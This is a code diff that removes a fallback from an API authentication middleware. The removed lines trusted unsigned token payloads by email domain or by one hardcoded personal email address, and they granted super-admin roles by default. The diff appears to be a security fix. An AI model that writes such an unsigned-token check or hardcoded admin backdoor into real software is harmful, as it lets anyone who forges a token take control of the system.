@@ -81,26 +81,7 @@ function requireInternalApiAuth(req, res, next) {
         } catch {}
       }
 
-      // 3. Fallback check for enterprise direct login session tokens (base64url payload)
-      if (!resolvedUser) {
-        try {
-          const parts = token.split('.');
-          if (parts.length === 3) {
-            const data = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));
-            if (data && data.email && (data.email.endsWith('@daralhai.com') || data.email === 'jessicaafawzyy80@gmail.com')) {
-              resolvedUser = {
-                sub: data.sub || `user-${data.email}`,
-                userNumber: data.userNumber || null,
-                fullName: data.fullName || 'Enterprise Staff',
-                email: data.email,
-                roles: data.roles || ['SUPER_ADMIN', 'ENGINEER'],
-                permissions: data.permissions || ['EQP_MANAGE', 'REPORTS_READ', 'SYSTEM_CONFIGURE'],
-              };
-            }
-          }
-        } catch {}
-      }
-
+      // Unsigned tokens are never trusted: only the signed paths above may resolve a user.
       if (resolvedUser) {
         req.platformUser = resolvedUser;
         req.user = resolvedUser;
